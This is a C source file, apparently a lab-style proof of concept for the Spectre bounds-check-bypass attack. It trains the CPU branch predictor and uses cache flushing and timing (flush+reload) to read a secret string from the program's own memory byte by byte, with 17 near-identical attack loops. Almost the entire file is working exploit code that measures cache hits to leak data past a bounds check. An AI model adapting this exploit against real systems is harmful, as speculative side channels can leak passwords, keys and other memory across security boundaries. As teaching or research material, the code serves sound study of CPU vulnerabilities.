#include <emmintrin.h>
#include <x86intrin.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

static int scores[256];
uint8_t array[256*4096];
unsigned int buffer_size = 10;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
char*secret = "Some Secret Value";
#define DELTA 1024
#define CACHE_HIT_THRESHOLD (80)

uint8_t restrictedAccess(size_t x){
if (x < buffer_size) {return buffer[x];} 
else {return 0;}}

void flushSideChannel(){
int i;// Write to array to bring it to RAM to prevent Copy-on-write
for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 +DELTA]);
}

void reloadSideChannelImproved(){
int i;
volatile uint8_t*addr;
register uint64_t time1, time2;
int junk = 0;
for (i = 0; i < 256; i++) {
addr = &array[i*4096 + DELTA];
time1 = __rdtscp(&junk);
junk =*addr;
time2 = __rdtscp(&junk) - time1;
if (time2 <= CACHE_HIT_THRESHOLD)
scores[i]++; /*if cache hit, add 1 for this value*/
}
}
void spectreAttack(size_t larger_x){
int i;
uint8_t s;
for (i = 0; i < 256; i++)  {
 _mm_clflush(&array[i*4096 + DELTA]); 
}
// Train the CPU to take the true branch inside victim().
for (i = 0; i < 10; i++) {
_mm_clflush(&buffer_size);
restrictedAccess(i);
}
// Flush buffer_size and array[] from the cache.
_mm_clflush(&buffer_size);
for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
// Ask victim() to return the secret in out-of-order execution.
s = restrictedAccess(larger_x);
array[s*4096 + DELTA] += 88;
}
int main(){
int i;
uint8_t s;
size_t larger_x = (size_t)(secret-(char*)buffer);
flushSideChannel();
int arr[20];
int j = 0;
for (i = 0; i < 256;  i++) scores[i] = 0;

for (i = 0; i < 1000; i++) {
spectreAttack(larger_x);
reloadSideChannelImproved();
}
for (i = 0; i < 1000; i++) {
spectreAttack(larger_x+1);
reloadSideChannelImproved();
}for (i = 0; i < 1000; i++) {
spectreAttack(larger_x+2);
reloadSideChannelImproved();
}for (i = 0; i < 1000; i++) {
spectreAttack(larger_x+3);
reloadSideChannelImproved();
}for (i = 0; i < 1000; i++) {
spectreAttack(larger_x+4);
reloadSideChannelImproved();
}for (i = 0; i < 1000; i++) {
spectreAttack(larger_x+5);
reloadSideChannelImproved();
}for (i = 0; i < 1000; i++) {
spectreAttack(larger_x+6);
reloadSideChannelImproved();
}for (i = 0; i < 1000; i++) {
spectreAttack(larger_x+7);
reloadSideChannelImproved();
}for (i = 0; i < 1000; i++) {
spectreAttack(larger_x+8);
reloadSideChannelImproved();
}for (i = 0; i < 1000; i++) {
spectreAttack(larger_x+9);
reloadSideChannelImproved();
}for (i = 0; i < 1000; i++) {
spectreAttack(larger_x+10);
reloadSideChannelImproved();
}for (i = 0; i < 1000; i++) {
spectreAttack(larger_x+11);
reloadSideChannelImproved();
}for (i = 0; i < 1000; i++) {
spectreAttack(larger_x+12);
reloadSideChannelImproved();
}for (i = 0; i < 1000; i++) {
spectreAttack(larger_x+13);
reloadSideChannelImproved();
}for (i = 0; i < 1000; i++) {
spectreAttack(larger_x+14);
reloadSideChannelImproved();
}for (i = 0; i < 1000; i++) {
spectreAttack(larger_x+15);
reloadSideChannelImproved();
}for (i = 0; i < 1000; i++) {
spectreAttack(larger_x+16);
reloadSideChannelImproved();
}
int max = 0;
for (i = 0; i < 256; i++){
if (scores[i] > 0) printf("%c\n", i);
if(scores[max] < scores[i]){  
max = i;
}
}
printf("Reading secret value at %p = ", (void*)larger_x);
printf("The  secret value is %c\n", max);
printf("The number of hits is %d\n", scores[max]);
return (0);
}
